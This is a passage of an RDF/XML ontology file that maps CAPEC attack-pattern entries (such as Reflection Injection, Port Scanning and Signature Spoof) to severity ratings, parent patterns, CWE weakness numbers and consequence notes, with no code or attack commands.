                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack174">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#138">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:137::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Reflection Injection"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack265">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#166">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:161::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Force the System to Reset Values"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits>
                      <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::306::"/>
                    </j.0:exploits>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack12">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#543">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:194::NATURE:CanPrecede:CAPEC ID:89::NATURE:CanFollow:CAPEC ID:98::NATURE:CanFollow:CAPEC ID:611::NATURE:CanFollow:CAPEC ID:630::NATURE:CanFollow:CAPEC ID:631::NATURE:CanFollow:CAPEC ID:632::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Counterfeit Websites"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack111">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#594">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Traffic Injection"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::940::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies>
                      <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution:NOTE:Availability Unreliable Execution The injection of specific content into a connection can trigger a disruption in that communications channel  thereby denying availability of the service.::SCOPE:IntegrityTECHNICAL IMPACT:Other:NOTE:Integrity Other An adversary&apos;s injection of additional content into a communication channel negatively impacts the integrity of that channel.::"/>
                    </j.0:implies>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack199">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#560">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:21::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Use of Known Domain Credentials"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits>
                      <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::522::"/>
                    </j.0:exploits>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack322">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#143">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:150::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Detect Unpublicized Web Pages"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack165">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#332">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:312::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#ICMP IP &apos;ID&apos; Field Error Message Probe"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack29">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#540">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:123::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Overread Buffers"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::125::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies>
                      <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data:NOTE:Confidentiality Read Data By reading outside the boundary of the intended buffer  the adversary is potentially able to see any data that is stored on the disk. This could include secret keys  personal information  and sensitive files.::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution:NOTE:Availability Unreliable Execution Depending on the use of the target buffer  an application or system crash can be achieved.::"/>
                    </j.0:implies>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack292">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#389">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:384::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Content Spoofing Via Application API Manipulation"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits>
                      <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::353::"/>
                    </j.0:exploits>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack256">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#161">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Infrastructure Manipulation"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack224">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#190">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:167::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Reverse Engineer an Executable to Expose Assumed Hidden Functionality"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits>
                      <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::912::"/>
                    </j.0:exploits>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack191">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#330">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:312::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#ICMP Error Message Echoing Integrity Probe"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack56">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#410">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Information Elicitation"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack353">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#519">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:447::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Documentation Alteration to Cause Errors in System Design"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack50">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#582">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:607::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Route Disabling"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies>
                      <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:AvailabilityTECHNICAL IMPACT:Other:NOTE:Availability Other Disabling a network route denies the availability of a service.::"/>
                    </j.0:implies>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack40">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#548">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Contaminate Resource"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack321">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#522">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:439::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Malicious Hardware Component Replacement"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack73">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#290">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:309::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Enumerate Mail Exchange (MX) Records"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack268">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#473">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:151::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Signature Spoof"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits>
                      <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::20::327::290::"/>
                    </j.0:exploits>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies>
                      <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Access Control:SCOPE:AuthenticationTECHNICAL IMPACT:Gain Privileges::"/>
                    </j.0:implies>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack278">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#458">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:456::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Flash Memory Attacks"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack285">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#569">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:116::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Collect Data as Provided by Users"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack272">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#523">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:439::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Malicious Software Implanted"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack190">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#329">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:312::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#ICMP Error Message Quoting Probe"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack62">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#541">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:224::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Application Fingerprinting"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack30">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#627">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:148::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Counterfeit GPS Signals"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies>
                      <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::"/>
                    </j.0:implies>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack183">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#300">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:169::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Port Scanning"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
